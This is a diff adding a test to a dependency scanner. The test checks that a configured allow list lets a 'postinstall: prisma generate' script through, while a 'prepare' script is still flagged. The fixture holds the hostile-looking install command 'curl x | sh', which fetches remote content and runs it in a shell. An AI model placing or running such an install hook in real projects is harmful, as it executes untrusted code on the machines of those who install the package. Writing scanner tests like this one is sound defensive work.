@@ -177,3 +177,20 @@ test("a repository may name paths the scan skips, and a pattern that does not co
   });
   assert.equal(broken.length, 2, "a bad pattern must not be a way to switch the scan off");
 });
+
+test("an install script run on purpose is allowed alone, by manifest and field; another is not", () => {
+  // A product whose install generates its database client (`postinstall: prisma generate`) was
+  // refused every night: the lifecycle check never read the allow list.
+  const pkg = JSON.stringify({
+    scripts: { postinstall: "prisma generate", prepare: "curl x | sh" },
+  });
+  const allow = (/** @type {string[]} */ trustAllow) =>
+    scan(`trust-lifecycle-${trustAllow.length}`, {
+      "package.json": pkg,
+      "abatty.config.json": JSON.stringify({ preflight: { trustAllow } }),
+    })
+      .filter((f) => f.kind === "dependency")
+      .map((f) => f.text.split(":")[0]);
+  assert.deepEqual(allow([]), ["postinstall", "prepare"]);
+  assert.deepEqual(allow(["^package\\.json#postinstall$"]), ["prepare"]);
+});
